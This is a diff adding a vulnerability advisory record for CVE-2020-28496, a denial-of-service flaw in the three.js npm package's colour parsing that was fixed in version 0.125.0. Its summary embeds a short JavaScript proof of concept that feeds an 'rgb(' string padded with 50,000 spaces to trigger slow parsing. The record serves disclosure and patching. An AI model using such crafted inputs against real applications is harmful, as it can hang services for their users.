@@ -1,0 +1,44 @@
+advisory_id: GHSA-fq6p-x6j3-cmmq
+datasource_id: github_osv_importer_v2/GHSA-fq6p-x6j3-cmmq
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/03/GHSA-fq6p-x6j3-cmmq/GHSA-fq6p-x6j3-cmmq.json
+aliases:
+  - CVE-2020-28496
+summary: "Denial of service in three\nThis affects the package three before 0.125.0. This can\
+  \ happen when handling rgb or hsl colors. \n\n**PoC:** \n```js\nvar three = require('three')\n\
+  function build_blank(n) {\n    var ret = \"rgb(\"\n    for (var i = 0; i < n; i++) {\n   \
+  \     ret += \" \"\n    }\n    return ret + \"\";\n}\nvar Color = three.Color\nvar time =\
+  \ Date.now();\nnew Color(build_blank(50000)) var time_cost = Date.now() - time;\nconsole.log(time_cost\
+  \ + \" ms\")\n```"
+impacted_packages:
+  - purl: pkg:npm/three
+    affected_versions: vers:npm/<0.125.0
+    fixed_versions: vers:npm/0.125.0
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/03/GHSA-fq6p-x6j3-cmmq/GHSA-fq6p-x6j3-cmmq.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-400
+references:
+  - url: https://github.com/mrdoob/three.js/issues/21132
+    reference_type:
+    reference_id:
+  - url: https://github.com/mrdoob/three.js/pull/21143/commits/4a582355216b620176a291ff319d740e619d583e
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2020-28496
+    reference_type:
+    reference_id:
+  - url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1065972
+    reference_type:
+    reference_id:
+  - url: https://snyk.io/vuln/SNYK-JS-THREE-1064931
+    reference_type:
+    reference_id:
